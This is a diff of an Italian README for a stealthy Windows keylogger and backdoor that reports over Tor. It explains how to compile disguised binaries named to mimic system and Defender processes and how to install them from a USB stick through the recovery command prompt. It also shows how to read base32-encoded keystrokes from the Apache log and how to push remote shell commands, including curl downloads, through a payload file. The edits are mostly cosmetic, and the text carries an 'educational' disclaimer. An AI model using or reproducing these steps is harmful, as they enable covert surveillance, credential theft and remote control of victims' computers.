@@ -1,4 +1,4 @@
-QUESTO PROGETTO É STATO CREATO SOLO A SCOPO EDUCATIVO E SPERIMENTALE, NON USARLO SU PC CHE NON SONO DI TUA PROPRIETÀ O NON FANNO PARTE DEL TUO LAB VIRTUALE!!
+QUESTO PROGETTO É STATO CREATO SOLO A SCOPO EDUCATIVO E SPERIMENTALE, NON USARLO SU PC CHE NON SONO DI TUA PROPRIETÀ O NON FANNO PARTE DEL TUO LAB VIRTUALE!
 ANCHE SE I NOMI SCELTI SONO ULTRA STEALTH NON SIGNIFICA CHE DEVE ESSERE USATO IN MODO SBAGLIATO!
 
 --------------------------------------- TheHiddenWiredProject ---------------------------------------
@@ -11,7 +11,7 @@ perchè tutto il traffico generato è instradato via Tor!
 Yeah bro, è 100% safe, il codice lo puoi modificare come vuoi senza problemi, mentre Tor ti aiuta
 a nascondere il tuo server (serve per ascoltare il keylogger e usare la backdoor).
 
-Quindi devo configurare un server!?
+Quindi devo configurare un server?
 Yeah, è necessario per avere un livello di anonimato abbastanza alto
 
 É pronto all'uso?
@@ -19,7 +19,7 @@ Assolutamente no, lo devi compilare tu, è ultra facile, continua a leggere che 
 
 Lo consigli?
 Assolutamente si! Questo tool è estremamente compatto, ma nello stesso tempo ultra stealth,
-non troveresti mai un keylogger con una backdoor via Tor su internet!!
+non troveresti mai un keylogger con una backdoor via Tor su internet!
 
 ----------------------------------------------------------------------------------------------------
 
@@ -83,24 +83,24 @@ e metti il tuo dominio (quello che finisce per .onion che hai trovato dentro il 
 
 ----------------------------------------------------------------------------------------------------
 
-Adesso hai tutto pronto!! Puoi testare su una VM Windows il funzionamento, se tutto funziona puoi compilare tutto!!
+Adesso é tutto pronto! Puoi testare su una VM Windows il funzionamento, se tutto funziona puoi compilare tutto!
 
 Per compilare tutto é necessaria una macchina Windows, useremo nuitka per trasformare i nostri file in python in eseguibili.
 
 1) Installa Python nella macchina Windows (Non da MStore ma dal sito ufficiale)
-2) Adesso apri il terminale e digita: pip install nuitka (SE PIP NON VIENE TROVATO RIAVVIA WINDOWS DOPO AVER INSTALLATO PYTHON!)
+2) Adesso apri il terminale e digita: pip install nuitka (Se pip non viene trovato, riavvia Windows dopo aver installato Python)
 3) Adesso digita: nuitka --onefile --windows-disable-console file.py
 
 # --onefile = unico file .exe
 # --windows-disable-console = no prompt quando viene eseguito
 
 4) Esegui nuitka per ogni file .py (Isass.py, WMIHost.py, wuasrvs.py)
-5) Dopo aver compilato tutti i file py devi compilare SecurityHealthSystray.bat con Bat-To-Exe-Converter (Cercalo su internte) NB: INSTALLER.BAT DEVE RIMANERE RAW, NON DEVE ESSERE COMPILATO!!!
+5) Dopo aver compilato tutti i file py devi compilare SecurityHealthSystray.bat con Bat-To-Exe-Converter (Cercalo su internet) NB: INSTALLER.BAT DEVE RIMANERE RAW, NON DEVE ESSERE COMPILATO!
 6) Aggiungi l'icona di defender al file .bat dentro il compilatore per avere un .exe con l'icona di Defender
 ----------------------------------------------------------------------------------------------------
 
 Adesso hai quasi finito!
-Copia il progetto compilato dentro una pendrive, copia il file installer.bat nella root della chiavetta, rimuovi la cartella "WPE" 
+Copia il progetto compilato dentro una pendrive, copia il file installer.bat nella directory principale della chiavetta, rimuovi la cartella "WPE" 
 e il risultato dovrebbe essere questo:
 
 E:\Isass.exe
@@ -115,16 +115,16 @@ Se non corrisponde hai sbagliato qualcosa.
 
 Come lo installo??
 1) Avvia Windows
-2) Una volta che ti trovi nella schermata di blocco, vai nel menu di spegnimento, premi "SHIFT" e poi "Riavvia"
-3) Dovresti leggere a schermo "Attendi"
+2) Una volta che ti trovi nella schermata di blocco, vai nel menu di spegnimento, tieni premuto "SHIFT" mentre premi su "Riavvia"
+3) Dovresti leggere a schermo "Attendere"
 4) Dopo il riavvio vai su: Risoluzione dei problemi > Opzioni avanzate > Prompt dei comandi
 5) Adesso cerca la lettera della chiavetta (varia da PC a PC), prova dalla C alla J (basta scrivere nel prompt la lettera seguita dai due punti, quindi "c:")
 6) Una volta trovata la pendrive esegui installer.bat
 7) Il PC si riavvierá da solo e TheHiddenWiredProject sará installato!
-8) Divertiti!!
+8) Divertiti!
 ----------------------------------------------------------------------------------------------------
 
-Adesso come controllo i tasti premuti??
+Adesso come controllo i tasti premuti?
 I tasti premuti vengono salvati nel server su "/var/log/apache2/access.log" in base32 in stack da 32 caratteri, bisogna decodificare da base32 a plaintext, basta cercare su internet "base32 to text", incolli la request e vedi i tasti premuti.
 
 Esempio:
@@ -132,7 +132,7 @@ root@debianVM:/var/log/apache2# cat access.log
 127.0.0.1 - - "GET /CODICE_UNIVOCO_GENERATO/MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA" 404
 127.0.0.1 - - "GET /CODICE_UNIVOCO_GENERATO/ORSXG5BBEE======" 404
 
-Prendiamo in considerazione solo la base 32, quindi questa: MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA
+Prendiamo in considerazione solo la base 32, quindi questa: MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA e questa: ORSXG5BBEE======
 se la decodifichiamo diventa: 
 
 stringa1: ciaoo, questo é un 
@@ -140,10 +140,10 @@ stringa2: test!!
 ----------------------------------------------------------------------------------------------------
 
 Invece per eseguire codice nella macchina, tramite la backdoor, basta modificare il file: /var/www/html/payloads_httpcmd/default.txt
-e scrivere codice shell per windows, e verrá eseguito con i privilegi dell'utente corrente, possiamo anche scaricare file con curl ed eseguirli.
+e scrivere codice shell per Windows, e verrá eseguito con i privilegi dell'utente corrente, possiamo anche scaricare file con curl ed eseguirli.
 Ma attenzione, devi fare in modo che il codice shell non venga eseguito in loop, perché cosí rischi di fare casino, quindi una volta che vedi 
-la richiesta del payload rimuovi il contenuto di default.txt, altrimenti il codice verrá eseguito ogni 60 secondi!!
+la richiesta del payload rimuovi il contenuto di default.txt, altrimenti il codice verrá eseguito ogni 60 secondi!
 
 ----------------------------------------------------------------------------------------------------
 
-DIVERTITI IN MODO ETICO E SANO, SENZA FARE DANNO!!
+DIVERTITI IN MODO ETICO E SANO, SENZA FARE DANNI REALI A PERSONE, DATI O SISTEMI CHE NON TI APPARTENGONO!
